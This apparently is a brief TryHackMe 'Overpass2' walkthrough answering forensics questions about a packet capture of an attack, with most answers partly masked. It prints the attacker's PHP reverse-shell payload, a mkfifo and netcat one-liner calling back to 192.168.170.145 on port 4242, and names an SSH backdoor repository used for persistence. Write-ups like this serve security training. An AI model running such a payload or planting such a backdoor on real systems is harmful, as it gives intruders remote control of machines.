# Overpass2 TryHackme Walkthrough

<p align="center">
  <img width="400" height="400" src="https://github.com/ceortiz33/tryhackme/blob/main/OverPass2/images/overpass2.png">
</p>


## Forensics - Analyze the PCAP
Para esta seccion se utiliza un archivo PCAP que nos entregan como evidencia de un ataque.

### What was the URL of the page they used to upload a reverse shell?

```
/dev********/
```

### What payload did the attacker use to gain access?

```
&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

### What password did the attacker used to get access?

```
when******************
```

### How did the attacker establish persistence?

```
https://github.com/*********/ssh-backdoor
```
